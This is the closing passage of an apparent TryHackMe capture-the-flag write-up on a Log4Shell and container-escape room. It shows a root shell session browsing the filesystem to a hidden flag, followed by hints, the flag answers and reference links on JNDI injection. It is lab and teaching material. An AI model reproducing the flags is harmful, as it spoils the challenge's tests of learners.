+drwx------    4 root     root        4.0K Dec 13  2021 root
+drwxr-xr-x    3 root     root        4.0K Dec  8  2021 run
+drwxr-xr-x    2 root     root        4.0K Dec 13  2021 sbin
+drwxr-xr-x    2 root     root        4.0K Dec  8  2021 srv
+drwxr-xr-x    2 root     root        4.0K Apr 24  2018 sys
+drwxrwxrwt    8 root     root        4.0K Jul  9 00:51 tmp
+drwxr-xr-x   12 root     root        4.0K Dec 13  2021 usr
+drwxr-xr-x   12 root     root        4.0K Dec 13  2021 var
+lrwxrwxrwx    1 root     root          31 Dec  8  2021 vmlinuz -> boot/vmlinuz-4.15.0-163-generic
+lrwxrwxrwx    1 root     root          31 Dec  8  2021 vmlinuz.old -> boot/vmlinuz-4.15.0-163-generic
+
+bash-4.4# cd root
+cd root
+bash-4.4# ls
+ls
+root.txt
+bash-4.4# cat root.txt
+cat root.txt
+Pffft. Come on. Look harder.
+bash-4.4# ls -lah
+ls -lah
+total 28
+drwx------    4 root     root        4.0K Dec 13  2021 .
+drwxr-xr-x   22 root     root        4.0K Jul  9 00:45 ..
+drwxr-xr-x    2 root     root        4.0K Dec 13  2021 ...
+-rw-r--r--    1 root     root        3.0K Apr  9  2018 .bashrc
+-rw-r--r--    1 root     root         148 Aug 17  2015 .profile
+drwx------    2 root     root        4.0K Dec 13  2021 .ssh
+-r--------    1 root     root          29 Dec 13  2021 root.txt
+bash-4.4# cd ...
+cd ...
+bash-4.4# ls
+ls
+bash-4.4# ls -lah
+ls -lah
+total 12
+drwxr-xr-x    2 root     root        4.0K Dec 13  2021 .
+drwx------    4 root     root        4.0K Dec 13  2021 ..
+-r--------    1 root     root          26 Dec 13  2021 ._fLaG2
+bash-4.4# cat ._fLaG2
+cat ._fLaG2
+THM{C0NT41N3R_3SC4P3_FTW}
+```
+What is the first flag?
+You need to look around. It's hiding in plain sight. Do you use the -a option when you are listing files and directories?
+What is the "real" root flag?
+Are you on the right HOST? Do you use "-iname" when you try to find flags? Look closer.
+
+## Flags / Answers
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/60cc02296b08450051b3f11b/room-content/11f1fcc9f0e429b239a54be50c58faeb.png)
+- ***THM{LOG4SHELL_FTW}***
+- ***THM{C0NT41N3R_3SC4P3_FTW}***
+
+## Notes / Lessons Learned
+**References used making this room**
+- [Lunasec.io blog post on Log4Shell](https://www.lunasec.io/docs/blog/log4j-zero-day/)
+- [Exploiting JNDI Injections in Java](https://www.veracode.com/blog/research/exploiting-jndi-injections-java)
+- [CVE-2021-44228 – Log4j 2 Vulnerability Analysis](https://www.randori.com/blog/cve-2021-44228/)
+- Malicious LDAP servers are fun. (Come on.... work for it a bit)
+Answer the questions below
+All your log belong to us.
+Completed
+[[KoTH Hackers]]
+
